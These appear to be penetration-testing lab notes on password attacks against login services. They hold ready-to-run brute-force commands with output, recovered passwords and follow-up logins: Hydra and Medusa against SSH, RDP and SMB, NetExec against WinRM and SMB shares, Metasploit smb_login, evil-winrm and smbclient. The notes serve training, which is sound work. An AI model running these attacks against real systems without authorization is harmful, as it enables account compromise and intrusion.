# WinRM
## NetExec
  
```Markdown
netexec <proto> <IP> -u <user> -p <pass>
```
```Markdown
[!bash!]$ netexec winrm 10.129.42.197 -u user.list -p password.list
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```
- for WinRM, ‘Pwn3d!’ jus means we can execute commands
  
## Evil-WinRM
```Markdown
evil-winrm -i <IP> -u <user> -p <pass>
```
  
# SSH
## Hydra
```Markdown
hydra -L <userlist> -P <passlist> ssh://<IP>
```
```Markdown
[!bash!]$ hydra -L user.list -P password.list ssh://10.129.42.197
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
  
  
# RDP
## Hydra
```Markdown
hydra -L <userlist> -P <passlist> rdp://<IP>
```
```Markdown
[!bash!]$ hydra -L user.list -P password.list rdp://10.129.42.197
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
  
## Medusa
```Markdown
medusa -M rdp -h <IP> -U <userfile> -P <passfile>
```
- output is way better than hydra
```Markdown
medusa -M rdp -h 10.129.202.136 -U username.list -P password.list                                                                                             
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                                               
                                                                                                                                                                  
2025-12-20 01:58:24 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: 123456 (1 of 202 complete)         
2025-12-20 01:58:25 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: 12345 (2 of 202 complete)          
2025-12-20 01:58:26 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: 123456789 (3 of 202 complete)      
2025-12-20 01:58:28 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: batman (4 of 202 complete)         
2025-12-20 01:58:30 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: password (5 of 202 complete)       
2025-12-20 01:58:31 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: iloveyou (6 of 202 complete)       
2025-12-20 01:58:33 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: princess (7 of 202 complete)       
2025-12-20 01:58:36 ACCOUNT CHECK: [rdp] Host: 10.129.202.136 (1 of 1, 0 complete) User: john (1 of 103, 0 complete) Password: november (8 of 202 complete)       
2025-12-20 01:58:36 ACCOUNT FOUND: [rdp] Host: 10.129.202.136 User: john Password: november [SUCCESS (0x0002000D:ERRCONNECT_CONNECT_TRANSPORT_FAILED (Access Denie
d))] 
```
  
## xFreeRDP
```Markdown
xfreerdp3 /v:<IP> /u:<user> /p:<pass>
```
```Markdown
xfreerdp /v:<target-IP> /u:<username> /p:<password>
[!bash!]$ xfreerdp /v:10.129.42.197 /u:user /p:password
<SNIP>
New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb
Do you trust the above certificate? (Y/T/N) Y
```
  
  
# SMB
## Hydra
```Markdown
hydra -L <userlist> -P <passlist> smb://<IP>
```
- if you get an invalid error reply, hydra is outdated and can’t handle SMBv3 requests
  
## Metasploit
```Markdown
use auxiliary/scanner/smb/smb_login
set user_file <userlist>
set pass_file <passlist>
set rhosts <IP>
run
```
  
## Netexec
```Markdown
netexec smb <IP> -u <user> -p <pass> --shares
```
```Markdown
[!bash!]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```
  
## SMBClient
```Markdown
smbclient -U <user> \\\\<IP>\\<share>
```